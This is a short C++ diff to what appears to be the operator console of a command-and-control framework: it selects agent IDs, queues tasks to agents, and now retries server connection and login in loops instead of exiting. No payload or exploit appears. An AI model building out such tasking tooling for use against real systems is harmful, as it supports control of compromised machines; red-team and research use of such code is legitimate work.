@@ -286,7 +286,7 @@ class Operator {
     }
 
     void Agent(const char* id, Communicate_ com) {
-        printf("\n\nUsing Agent ID : %s \n\n", id);
+        printf("\nUsing Agent ID : %s \n\n", id);
         char cmd[BUFFER_SIZE];
         while (1) {
             memset(cmd, 0, sizeof(cmd));
@@ -317,7 +317,6 @@ class Operator {
                 com.new_task(id, task);
                 printf("[+] Added Task \n");
             }
-
         }
     }
 };
@@ -332,14 +331,21 @@ int main() {
     Communicate_ com;
     Operator op;
 
-    if (com.conn() != 0) {
+    while (1) {
+        if (com.conn() == 0) {
+            break;
+        };
         printf("Failed to connect to server: \n");
-        exit(0);
-    };
-    char *creds = op.login();
-    if (com.authenticate(creds) == false) {
-        printf("Failed to authenticate: \n");
-        exit(0);
+        sleep(3);
+    }
+    
+    while (1) {
+        char *creds = op.login();
+        if (com.authenticate(creds) == true) {
+            break;
+        }
+        printf("Failed to authenticate: \nTry Again\n\n");
+        sleep(1);
     }
 
     char cmd[BUFFER_SIZE];
@@ -371,9 +377,6 @@ int main() {
                 continue;
             }
         } 
-        
-        
-        
         else {
             printf("%s", usage);
         }
